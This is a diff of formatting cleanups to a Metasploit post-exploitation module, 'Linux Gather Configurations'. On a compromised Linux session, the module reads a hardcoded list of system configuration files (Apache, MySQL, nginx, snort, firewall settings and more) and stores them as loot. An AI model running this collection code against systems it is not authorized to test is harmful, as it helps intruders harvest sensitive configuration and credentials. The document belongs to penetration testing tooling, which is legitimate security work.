@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,26 +7,24 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Linux::System
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Gather Configurations',
-      'Description'   => %q{
-        This module collects configuration files found on commonly installed
-        applications and services, such as Apache, MySQL, Samba, Sendmail, etc.
-        If a config file is found in its default path, the module will assume
-        that is the file we want.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'ohdae <bindshell[at]live.com>',
-        ],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Linux Gather Configurations',
+                      'Description'   => %q(
+                        This module collects configuration files found on commonly installed
+                        applications and services, such as Apache, MySQL, Samba, Sendmail, etc.
+                        If a config file is found in its default path, the module will assume
+                        that is the file we want.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'ohdae <bindshell[at]live.com>'
+                        ],
+                      'Platform'      => ['linux'],
+                      'SessionTypes'  => ['shell', 'meterpreter']))
   end
 
   def run
@@ -40,11 +39,11 @@ class MetasploitModule < Msf::Post
     find_configs
   end
 
-  def save(file, data, ctype="text/plain")
+  def save(file, data, ctype = "text/plain")
     ltype = "linux.enum.conf"
     fname = ::File.basename(file)
     loot = store_loot(ltype, ctype, session, data, fname)
-    print_status("#{fname} stored in #{loot.to_s}")
+    print_status("#{fname} stored in #{loot}")
   end
 
   def get_host
@@ -55,11 +54,11 @@ class MetasploitModule < Msf::Post
       host = cmd_exec("hostname").chomp
     end
 
-    return host
+    host
   end
 
   def find_configs
-    configs =[
+    configs = [
       "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
       "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
       "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
@@ -73,7 +72,7 @@ class MetasploitModule < Msf::Post
     ]
 
     configs.each do |f|
-      output = read_file("#{f}")
+      output = read_file(f.to_s)
       save(f,  output) if output && output !~ /No such file or directory/
     end
   end
